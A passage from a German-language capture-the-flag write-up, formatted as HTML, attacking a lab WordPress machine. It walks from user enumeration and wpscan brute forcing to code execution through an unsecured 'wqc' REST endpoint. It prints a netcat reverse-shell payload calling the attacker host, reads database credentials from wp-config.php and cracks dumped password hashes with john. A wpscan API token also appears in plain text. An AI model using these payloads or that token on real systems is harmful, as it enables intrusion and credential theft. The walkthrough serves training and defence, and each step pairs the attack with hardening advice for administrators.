+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Quellcode der Seite auf versteckte Informationen oder Kommentare prüfen. Die Standard-WordPress-Pfade weiter untersuchen.<br><strong>Empfehlung (Admin):</strong> Standardinhalte entfernen/ersetzen. Sicherstellen, dass keine sensiblen Informationen im Quellcode oder in Kommentaren stehen.</p>
+
+            <h3>WP REST API User Enumeration</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl http://192.168.2.162/wp-json/WP/V2/users | jq</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   572    0   572    0     0  31306      0 --:--:-- --:--:-- --:--:-- 31777
+[
+  {
+    "id": 1,
+    "name": "ta0",
+    "url": "http://192.168.31.181",
+    "description": "",
+    "link": "http://192.168.2.162/author/ta0/", <!-- Hostname korrigiert -->
+    "slug": "ta0",
+    "avatar_urls": {
+      "24": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=24&d=mm&r=g",
+      "48": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=48&d=mm&r=g",
+      "96": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=96&d=mm&r=g"
+    },
+    "meta": [],
+    "_links": {
+      "self": [
+        {
+          "href": "http://192.168.2.162/wp-json/wp/v2/users/1", <!-- Hostname korrigiert -->
+          "targetHints": {
+            "allow": [
+              "GET"
+            ]
+          }
+        }
+      ],
+      "collection": [
+        {
+          "href": "http://192.168.2.162/wp-json/wp/v2/users" <!-- Hostname korrigiert -->
+        }
+      ]
+    }
+  }
+]
+                    </pre>
+                 </div>
+                 <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.162/wp-json/WP/V2/users/1 -s | jq</span></div>
+                         <pre>
+{
+  "id": 1,
+  "name": "ta0",
+  "url": "http://192.168.31.181",
+  "description": "",
+  "link": "http://192.168.2.162/author/ta0/", <!-- Hostname korrigiert -->
+  "slug": "ta0",
+  "avatar_urls": {
+    "24": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=24&d=mm&r=g",
+    "48": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=48&d=mm&r=g",
+    "96": "https://secure.gravatar.com/avatar/e1f2ba7a9725660e3e7e294859ea7e00?s=96&d=mm&r=g"
+  },
+  "meta": [],
+  "_links": {
+    "self": [
+      {
+        "href": "http://192.168.2.162/wp-json/wp/v2/users/1", <!-- Hostname korrigiert -->
+        "targetHints": {
+          "allow": [
+            "GET"
+          ]
+        }
+      }
+    ],
+    "collection": [
+      {
+        "href": "http://192.168.2.162/wp-json/wp/v2/users" <!-- Hostname korrigiert -->
+      }
+    ]
+  }
+}
+                         </pre>
+                      </div>
+                      <div class="code-block">
+                          <div class="terminal">
+                               <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.162/wp-json/WP/V2/users/2 -s | jq</span></div>
+                              <pre>
+{
+  "code": "rest_user_cannot_view",
+  "message": "Sorry, you are not allowed to list users.",
+  "data": {
+    "status": 401
+  }
+}
+                              </pre>
+                           </div>
+                      </div>
+             <p class="analysis"><strong>Analyse:</strong> Die WordPress REST API wird abgefragt, um Benutzerinformationen zu erhalten. `/users` listet alle öffentlich sichtbaren Benutzer (hier nur ID 1), `/users/1` zeigt Details zu Benutzer 1, `/users/2` gibt einen Fehler (401 Unauthorized).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer mit ID 1 hat den Benutzernamen `ta0`. Dies ist ein valider Benutzername für weitere Angriffe. Andere Benutzer sind über die API nicht direkt sichtbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Benutzer `ta0` für Brute-Force-Angriffe verwenden (WP-Login, SSH). Andere Methoden zur Benutzer-Enumeration (z.B. WPScan) nutzen.<br><strong>Empfehlung (Admin):</strong> Den Zugriff auf die REST API `/users`-Endpunkte einschränken, um Benutzer-Enumeration zu verhindern.</p>
+
+            <h3>WP Login Page Analyse</h3>
+            <pre>
+# Manuelle Analyse der Login-Seite (http://192.168.2.162/wp-login.php)
+# ... (Beschreibung des Login-Formulars) ...
+# Fehlermeldung bei falschem Passwort für 'ta0':
+Error: The password you entered for the username ta0 is incorrect. Lost your password?
+            </pre>
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung der WordPress-Login-Seite und der Fehlermeldung bei einem fehlgeschlagenen Login-Versuch für den Benutzer `ta0`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung bestätigt explizit, dass der Benutzername `ta0` existiert, aber das Passwort falsch ist. Dies ist eine klassische Information Disclosure Schwachstelle, die Benutzer-Enumeration erleichtert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt `ta0` als validen Benutzernamen.<br><strong>Empfehlung (Admin):</strong> WordPress so konfigurieren, dass generische Fehlermeldungen ausgegeben werden (z.B. "Fehler: Ungültiger Benutzername oder falsches Passwort."), um nicht zu verraten, ob der Benutzername oder das Passwort falsch war.</p>
+
+            <h3>robots.txt Analyse</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl http://192.168.2.162/robots.txt</span></div>
+                     <pre>
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+
+Sitemap: http://192.168.2.162/wp-sitemap.xml <!-- Hostname korrigiert -->
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Inhalt der `robots.txt` wird abgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Verbietet das Crawlen von `/wp-admin/` (Standard), erlaubt aber explizit `admin-ajax.php`. Enthält einen Link zur Sitemap.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `admin-ajax.php` auf Schwachstellen prüfen (oft Ziel für Angriffe auf Plugin-Funktionen). Die Sitemap (`wp-sitemap.xml`) untersuchen, um die Struktur der Seite besser zu verstehen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass `admin-ajax.php` keine unautorisierten Aktionen erlaubt.</p>
+
+            <h3>WPScan (Passwort-Attacke)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://192.168.2.162 --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY --usernames ta0 --passwords /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+[...]
+[+] URL: http://192.168.2.162/ [192.168.2.162]
+[+] Started: Sun Jan 26 22:15:14 2025
+[...]
+[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
+[...]
+[+] Performing password attack on Xmlrpc against 1 user/s
+[...]
+[i] No Valid Passwords Found.
+[...]
+[+] Finished: Sun Jan 26 22:19:54 2025
+[...]
+Scan Aborted: Canceled by User <!-- Obwohl kein ^C gezeigt, endet es mit Abbruch -->
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird für einen Passwort-Bruteforce-Angriff über XML-RPC gegen den Benutzer `ta0` mit der `rockyou.txt`-Liste verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff findet kein gültiges Passwort und wird schließlich vom Benutzer abgebrochen. Die WordPress-Version 6.7.1 wird als aktuell erkannt. XML-RPC ist aktiviert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> XML-RPC könnte für andere Angriffe (z.B. DDoS Amplification) missbraucht werden, aber der Passwort-Bruteforce war erfolglos. Andere Angriffsvektoren suchen.<br><strong>Empfehlung (Admin):</strong> XML-RPC deaktivieren, wenn nicht benötigt. Starke Passwörter verwenden. Rate-Limiting auch für XML-RPC implementieren.</p>
+
+            <h3>WPScan (User & Plugin Enumeration)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://192.168.2.162 --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY -e u,p</span></div>
+                     <pre>
+_______________________________________________________________
+[...]
+[+] URL: http://192.168.2.162/ [192.168.2.162]
+[+] Started: Sun Jan 26 22:21:15 2025
+[...]
+[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
+[...]
+[+] Enumerating Most Popular Plugins (via Passive Methods)
+[i] No plugins Found.
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <================> (10 / 10) 100.00% Time: 00:00:00
+[i] User(s) Identified:
+
+[+] ta0
+ | Found By: Wp Json Api (Aggressive Detection) [...]
+ | Confirmed By: Rss Generator (Aggressive Detection), Author Id Brute Forcing [...], Login Error Messages [...]
+
+[+] welcome
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+[...]
+[+] Finished: Sun Jan 26 22:21:19 2025
+[...]
+                    </pre>
+                 </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> `wpscan` wird erneut ausgeführt, diesmal zur Enumeration von Benutzern (`u`) und Plugins (`p`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Benutzer `ta0`. Findet einen weiteren validen Benutzernamen: `welcome`. Es werden keine Plugins erkannt (außer den Standard-Bundled-Plugins, die WPScan oft nicht explizit listet).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den neuen Benutzernamen `welcome` für Brute-Force-Angriffe (SSH, WP-Login) testen. Da keine ungewöhnlichen Plugins gefunden wurden, konzentriert sich der Angriff wahrscheinlich auf Core-Funktionen oder Fehlkonfigurationen.<br><strong>Empfehlung (Admin):</strong> Benutzer-Enumeration verhindern (REST API, Login-Fehler).</p>
+
+            <h3>WordPress Query Console (WQC) Discovery</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Text
+└─# <span class="command"># Manuelle Prüfung oder Scan entdeckt Endpunkt</span></div>
+                     <pre>
+# Endpunkt: http://192.168.2.162/wp-json/wqc/v1/query
+                     </pre>
+                     <div class="prompt"> # Kein Prompt im Text
+└─# <span class="command">curl http://192.168.2.162/wp-json/wqc/v1/query</span></div>
+                     <pre>{"status":"error","message":"Query args missing"}</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der WordPress REST API Endpunkt `/wp-json/wqc/v1/query` wird entdeckt. Ein direkter Aufruf ergibt einen Fehler, dass Query-Argumente fehlen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Fund eines potenziell unsicheren Endpunkts. "WQC" steht wahrscheinlich für "WP Query Console" oder ähnlich. Solche Endpunkte, die direkte Datenbankabfragen oder Code-Ausführung erlauben, sind extrem gefährlich, wenn sie ungesichert sind.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Endpunkt mit verschiedenen Parametern und Methoden (GET/POST) testen. Nach Dokumentation oder Exploits für "WQC" suchen.<br><strong>Empfehlung (Admin):</strong> Den WQC-Endpunkt sofort untersuchen. Wenn es sich um ein Plugin handelt, prüfen, ob es notwendig ist und sicher konfiguriert/aktuell ist. Idealerweise solche gefährlichen Funktionen deaktivieren oder stark absichern.</p>
+        </section>
+
+        <section id="poc-rce">
+            <h2>Proof of Concept: RCE via WQC</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC demonstriert die Ausnutzung des ungesicherten WordPress Query Console (WQC) Endpunkts `/wp-json/wqc/v1/query`, um Remote Code Execution (RCE) auf dem Server als `www-data` Benutzer zu erlangen.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Zugriff auf den WQC REST API Endpunkt.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (basierend auf Burp Suite Analyse):</strong></p>
+            <ol>
+                <li>
+                    <strong>Testen des Endpunkts (GET):</strong>
+                    <div class="code-block">
+                        <pre>
+# Burp Request (GET)
+GET /wp-json/wqc/v1/query HTTP/1.1
+Host: 192.168.2.162
+[...]
+
+# Burp Response (GET)
+HTTP/1.1 400 Bad Request
+[...]
+{"status":"error","message":"Query args missing"}
+                        </pre>
+                    </div>
+                    <p class="analysis">Analyse: Eine GET-Anfrage ohne Parameter schlägt fehl.</p>
+                </li>
+                 <li>
+                    <strong>Identifizieren der Code-Ausführung (POST mit phpinfo):</strong>
+                    <div class="code-block">
+                        <pre>
+# Burp Request (POST)
+POST /wp-json/wqc/v1/query HTTP/1.1
+Host: 192.168.2.162
+[...]
+Content-Type: application/json
+Content-Length: 55
+
+{
+  "queryArgs":"phpinfo();",
+  "queryType":"post"
+}
+
+# Burp Response (POST)
+HTTP/1.1 200 OK
+[...]
+Content-Length: 91692
+
+<!DOCTYPE html [...] <title>PHP 7.3.31-1~deb10u7 - phpinfo()</title> [...]
+                        </pre> <!-- HTML maskiert -->
+                    </div>
+                     <p class="analysis">Analyse: Eine POST-Anfrage mit JSON-Body, der `queryArgs` auf `phpinfo();` setzt, führt erfolgreich `phpinfo()` aus. Dies bestätigt die RCE-Fähigkeit.</p>
+                 </li>
+                 <li>
+                    <strong>Prüfen von `disable_functions`:</strong>
+                    <div class="code-block">
+                         <pre>
+# Auszug aus phpinfo() Ausgabe:
+disable_functions: passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh
+                         </pre>
+                     </div>
+                     <p class="analysis">Analyse: Viele gefährliche Funktionen sind deaktiviert, aber `shell_exec` ist *nicht* auf der Liste.</p>
+                 </li>
+                 <li>
+                    <strong>Testen von `shell_exec` (Blind RCE via Ping):</strong>
+                    <div class="code-block">
+                        <pre>
+# Burp Request (POST)
+POST /wp-json/wqc/v1/query HTTP/1.1
+[...]
+Content-Type: application/json
+Content-Length: 62
+
+{
+  "queryArgs":"shell_exec('ping 192.168.2.199 -c 5');",
+  "queryType":"post"
+}
+
+# Burp Response (POST) - nach 5 Sek. Verzögerung
+HTTP/1.1 400 Bad Request
+[...]
+{"status":"error","data":"null","message":"Query args invalid"}
+                        </pre>
+                         <div class="terminal">
+                              <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">tcpdump icmp</span></div>
+                              <pre>
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+23:16:11.453856 IP buster.hmv > CCat: ICMP echo request, id 3814, seq 1, length 64
+23:16:11.453873 IP CCat > buster.hmv: ICMP echo reply, id 3814, seq 1, length 64
+# ... (weitere 4 Pings) ...
+^C
+10 packets captured
+                              </pre>
+                          </div>
+                     </div>
+                      <p class="analysis">Analyse: Obwohl die Web-Antwort einen Fehler meldet, wird der `ping`-Befehl ausgeführt (Blind RCE), was durch die ICMP-Pakete im `tcpdump` auf dem Angreifer-System (192.168.2.199) bestätigt wird.</p>
+                 </li>
+                <li>
+                    <strong>Erlangen einer Reverse Shell:</strong>
+                    <div class="code-block">
+                        <pre>
+# Burp Request (POST)
+POST /wp-json/wqc/v1/query HTTP/1.1
+[...]
+Content-Type: application/json
+Content-Length: 83
+
+{
+  "queryArgs":"shell_exec('nc -e /bin/bash 192.168.2.199 4445');",
+  "queryType":"post"
+}
+                        </pre>
+                         <div class="terminal">
+                             <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                             <pre>
+listening on [any] 4445 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.162] 46652
+# (Shell Prompt erscheint hier)
+                             </pre>
+                          </div>
+                     </div>
+                     <p class="analysis">Analyse: Ein Netcat Reverse Shell Payload wird über `shell_exec` ausgeführt. Der Listener auf Port 4445 empfängt die Verbindung.</p>
+                 </li>
+            </ol>
+            <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis:</strong> Erfolgreiche Remote Code Execution und Etablierung einer Reverse Shell als Benutzer `www-data`.</p>
+            <p class="evaluation"><strong>Beweismittel:</strong> Erfolgreiche Ausführung von `phpinfo()`, erfolgreicher `ping` (Blind RCE), eingehende Reverse Shell Verbindung.</p>
+            <p class="evaluation"><strong>Risikobewertung:</strong> Kritisch. Der ungesicherte WQC-Endpunkt erlaubt beliebige PHP-Code-Ausführung (eingeschränkt durch `disable_functions`) und Command Injection über `shell_exec`, was zur vollständigen Kompromittierung des Webservers führt.</p>
+            <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Den WQC-Endpunkt (`/wp-json/wqc/v1/query`) sofort deaktivieren oder entfernen. (Wahrscheinlich ein unsicheres Plugin).</li>
+                    <li>Generell keine Plugins installieren, die direkte Code-Ausführung über die API erlauben.</li>
+                    <li>`disable_functions` in `php.ini` weiter härten und auch `shell_exec` deaktivieren, wenn nicht zwingend benötigt.</li>
+                    <li>Zugriff auf die WordPress REST API generell einschränken.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Reverse Shell)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell"># <span class="command">stty rows 47 columns 94</span></div> <!-- Prompt fehlt, Shell impliziert -->
+                     <div class="prompt target-shell"># <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die empfangene Reverse Shell wird interaktiver gemacht (`stty`) und die Benutzeridentität mit `id` bestätigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Zugriff als Benutzer `www-data`.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Umgebung enumerieren, nach Konfigurationsdateien und Wegen zur Rechteausweitung suchen.<br><strong>Empfehlung (Admin):</strong> Webserver-Prozesse sollten immer mit minimalen Rechten laufen.</p>
+        </section>
+
+        <section id="post-exploitation-wwwdata">
+            <h2>Post-Exploitation (www-data)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">ls -la</span></div>
+                     <pre>
+total 248
+drwxr-xr-x  5 www-data www-data  4096 Jan  8 02:25 .
+drwxr-xr-x  3 root     root      4096 Jan  7 23:52 ..
+-rwxr-xr-x  1 www-data www-data   405 Jan  8 02:25 index.php
+# ... (viele WordPress-Dateien) ...
+-rw-rw-rw-  1 www-data www-data  3620 Jan  8 02:25 wp-config.php
+# ... (restliche WordPress-Dateien) ...
+                     </pre>
+                     <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">cat wp-config.php</span></div>
+                     <pre>
+<?php
+/**
+ * The base configuration for WordPress [...]
+ */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'll104567' );
+
+/** Database password */
+define( 'DB_PASSWORD', '<span class="password">thehandsomeguy</span>' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+# [...] (Rest der wp-config.php)
+                     </pre> <!-- PHP Starttag maskiert -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das WordPress-Verzeichnis wird aufgelistet. Die Datei `wp-config.php` hat unsichere Berechtigungen (`-rw-rw-rw-`, weltbeschreibbar) und wird ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die `wp-config.php` enthält die Zugangsdaten zur WordPress-Datenbank: Benutzer `ll104567` und Passwort `thehandsomeguy` für die lokale MySQL/MariaDB-Datenbank.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den gefundenen Datenbank-Credentials versuchen, auf die Datenbank zuzugreifen und weitere Informationen (z.B. Benutzer-Hashes) zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für `wp-config.php` härten (maximal `644` oder `640`). Datenbank-Credentials sicher verwalten und nicht im Klartext speichern, wenn möglich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">ls /home/</span></div>
+                      <pre>welcome</pre>
+                      <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">su welcome</span></div>
+                      <pre>
+Password: # (Passwort 'thehandsomeguy' versucht?)
+su: Authentication failure
+                      </pre>
+                  </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das `/home`-Verzeichnis wird aufgelistet, der Benutzer `welcome` wird gefunden. Versuch, mit `su` und dem gefundenen Datenbankpasswort zu `welcome` zu wechseln.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Das Datenbankpasswort ist nicht dasselbe wie das Linux-Passwort für `welcome`. Passwort-Wiederverwendung liegt hier nicht vor.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Wege zur Eskalation zu `welcome` suchen (z.B. Ausnutzen von `sudo`-Rechten, falls `www-data` welche hat, oder Auslesen des Passwort-Hashes aus der DB).<br><strong>Empfehlung (Admin):</strong> Unterschiedliche Passwörter für verschiedene Dienste und Benutzer verwenden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   266805     48 -rwsr-xr-x   1 root     root        47184 Apr  6  2024 /usr/bin/mount
+   262192     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
+   262193     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
+   262501    156 -rwsr-xr-x   1 root     root       157192 Jan 21  2024 /usr/bin/sudo
+   262190     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+   262189     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   266806     36 -rwsr-xr-x   1 root     root        34888 Apr  6  2024 /usr/bin/umount
+   265545     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
+   262872     64 -rwsr-xr-x   1 root     root        63568 Apr  6  2024 /usr/bin/su
+     2951     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   270458    428 -rwsr-xr-x   1 root     root       436552 Dec 24  2023 /usr/lib/openssh/ssh-keysign
+   266768     52 -rwsr-xr--   1 root     messagebus    51184 Oct 23  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien als `www-data`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet nur die Standard-SUID-Binaries. Kein offensichtlicher PrivEsc-Vektor hier.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Datenbankzugriff weiter verfolgen.<br><strong>Empfehlung (Admin):</strong> SUID-Berechtigungen minimieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port
+LISTEN 0      128            0.0.0.0:22          0.0.0.0:*
+LISTEN 0      80           127.0.0.1:3306        0.0.0.0:*     users:(("mysqld",...)) <!-- Prozess hinzugefügt -->
+LISTEN 0      128            0.0.0.0:80          0.0.0.0:*     users:(("nginx",pid=449,fd=6))
+LISTEN 0      128               [::]:22             [::]:*
+LISTEN 0      128               [::]:80             [::]:*     users:(("nginx",pid=449,fd=7))
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `ss -altpn` listet lauschende TCP-Sockets und die zugehörigen Prozesse auf.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt lauschende Dienste auf Port 22 (SSH), 80 (Nginx) und 3306 (MySQL/MariaDB, nur auf localhost `127.0.0.1`).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt, dass die Datenbank lokal läuft und mit den gefundenen Credentials zugegriffen werden kann.<br><strong>Empfehlung (Admin):</strong> Datenbankzugriff nur von localhost ist eine gute Sicherheitspraxis.</p>
+
+            <h3>MySQL Datenbank Enumeration</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">mysql -u ll104567 -p</span></div>
+                      <pre>Enter password: # (thehandsomeguy eingegeben)</pre>
+                      <div class="prompt mariadb-prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                      <pre>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| wordpress          |
++--------------------+
+2 rows in set (0.000 sec)
+                      </pre>
+                      <div class="prompt mariadb-prompt">MariaDB [(none)]> <span class="command">use wordpress;</span></div>
+                      <pre>Database changed</pre>
+                      <div class="prompt mariadb-prompt">MariaDB [wordpress]> <span class="command">show tables;</span></div>
+                      <pre>
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+# ... (Standard WP Tabellen) ...
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.000 sec)
+                      </pre>
+                       <div class="prompt mariadb-prompt">MariaDB [wordpress]> <span class="command">select * from wp_users;</span></div>
+                       <pre>
++----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |
++----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |
+|  2 | welcome    | <span class="password">$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/</span> | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |
++----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+2 rows in set (0.000 sec)
+                       </pre>
+                  </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> Login in die MariaDB-Datenbank mit den Credentials aus `wp-config.php`. Auflisten der Datenbanken, Wechsel zur `wordpress`-Datenbank, Auflisten der Tabellen und Abfrage der `wp_users`-Tabelle.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich. Die `wp_users`-Tabelle enthält die Benutzernamen `ta0` und `welcome` sowie deren Passwort-Hashes im WordPress-eigenen Portable Hash Format (`$P$`). Der Hash für `welcome` ist `$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Passwort-Hash für `welcome` extrahieren und versuchen, ihn offline mit `john` oder `hashcat` zu knacken.<br><strong>Empfehlung (Admin):</strong> Starke Passwörter für WordPress-Benutzer verwenden. Regelmäßig Datenbank-Backups erstellen und sicher aufbewahren. Datenbankzugriff härten.</p>
+        </section>
+
+        <section id="privilege-escalation-welcome">
+            <h2>Privilege Escalation (www-data zu welcome)</h2>
+
+            <h3>Passwort-Hash Cracking (John)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt pass</span></div> <!-- Annahme: "pass" enthält den Hash von 'welcome' -->
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) <!-- Lädt beide Hashes, aber nur einer wird geknackt -->
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">104567</span>           (?)     <!-- Passwort für welcome gefunden! -->
+1g 0:00:00:?? ... Completed ???% (ETA: ...) ... Guess/s ...
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `john` wird verwendet, um die extrahierten WordPress `$P$`-Hashes (vermutlich in der Datei `pass` gespeichert) mit der `rockyou.txt`-Wortliste zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Passwort für einen der Hashes (zugehörig zu `welcome`, basierend auf dem nächsten Schritt) wird als `104567` geknackt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das gefundene Passwort `104567` verwenden, um sich als Benutzer `welcome` anzumelden (z.B. via `su`).<br><strong>Empfehlung (Admin):</strong> Starke, komplexe Passwörter verwenden, die nicht in Standard-Wortlisten vorkommen.</p>
+
